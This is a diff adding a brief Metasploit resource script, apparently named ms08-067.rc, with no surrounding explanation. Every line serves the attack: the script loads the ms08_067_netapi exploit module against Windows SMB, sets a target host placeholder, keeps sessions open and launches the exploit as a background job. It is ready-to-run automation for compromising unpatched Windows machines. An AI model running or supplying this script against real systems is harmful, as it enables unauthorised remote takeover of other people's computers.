@@ -1,0 +1,8 @@
+#script name = ms08-067.rc
+# msfconsole -r ms08-067.rc
+
+#source code
+use exploits/windows/smb/ms08_067_netapi
+set RHOST <IP>
+set ExitOnSession false
+exploit -j -z
